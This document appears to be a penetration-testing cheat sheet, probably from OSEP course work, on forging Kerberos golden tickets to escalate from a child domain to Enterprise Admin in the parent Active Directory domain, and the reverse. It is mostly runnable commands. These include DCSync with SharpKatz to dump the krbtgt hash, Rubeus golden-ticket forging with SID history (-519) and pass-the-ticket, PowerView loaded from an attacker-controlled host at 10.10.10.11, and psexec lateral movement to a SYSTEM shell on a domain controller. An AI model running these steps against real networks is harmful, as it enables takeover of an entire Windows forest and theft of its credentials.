# Golden Ticket

## Child Domain to Parent Domain

Creating golden ticket to be a part of EA within the parent domain from the child domain

### 1) Get krbtgt token from the child domain using DCSync

    krbtgt -> ffffffffffffffffffffffffffffffff


### 2) Try to access CIFS on DC02

    ls //dc02.domain.com/c$


### 3) Check the tickets

    execute -o klist


### 4) Get the SIDs for the forest domain and its child

    Get-DomainSID -Domain child.domain.com
    Get-DomainSid -Domain domain.com
    sharpsh -t 20 -- '-u http://10.10.10.11/powershell-scripts/PowerView.ps1 -c "Get-DomainSid -Domain child.domain.com"'
    sharpsh -t 20 -- '-u http://10.10.10.11/powershell-scripts/PowerView.ps1 -c "Get-DomainSid -Domain domain.com"'


We get

    S-1-5-21-2032401531-514583578-4118012345
    S-1-5-21-1135011135-3178090508-3151412345


### 5) Draft golden ticket - user can be anything bogus - sid is current domain SID and SIDs is child's - Also -519 is the EA group identifier and is static

    rubeus -t 30 -- golden /rc4:ffffffffffffffffffffffffffffffff /sid:S-1-5-21-2032401531-514583578-4118012345 /sids:S-1-5-21-1135011135-3178090508-3151412345-519 /ldap /user:Administrator /domain:child.domain.com /nowrap /ptt

### 6) Check the tickets

    execute -o klist

### 7) Try accessing the C$ now

    ls //dc02.domain.com/c$


### 8) Go into client -> nt auth\system shell and then

    psexec -d Title -s Description -p osep-lateral dc02.domain.com

## Parent Domain to Child Domain

All this or just add yourself into EA by being a DA on the parent domain

### 1) DCSync to do SharpKatz - Only the DA -> Admin can do it hence we do runas above

    execute-assembly /home/kali/tools/bins/csharp-files/SharpKatz.exe --Command dcsync --User domain.com\\krbtgt --Domain domain.com --DomainController dc01.domain.com


Hashes

    krbtgt -> ffffffffffffffffffffffffffffffff


### 2) Get the SIDs for the domain

    Get-DomainSID -Domain domain.com
    sharpsh -t 20 -- '-u http://10.10.10.11/powershell-scripts/PowerView.ps1 -c "Get-DomainSid -Domain domain.com"'

We get

    domain.com -> S-1-5-21-1725955968-4040474791-670212345


### 3) Draft golden ticket - user can be anything bogus - sid and sids are same with sids containing group id for EA

    rubeus -t 30 -- golden /rc4:ffffffffffffffffffffffffffffffff /sid:S-1-5-21-1725955968-4040474791-670212345 /sids:S-1-5-21-1725955968-4040474791-670212345-519 /ldap /user:Administrator /domain:domain.com /nowrap /ptt


### 4) Check the tickets

    execute -o klist


### 5) Try accessing the C$ now

    ls //dc02.dev.domain.com/c$


### 6) Go into client -> nt auth\system shell and then

    psexec -d Title -s Description -p osep-lateral dc02.dev.domain.com
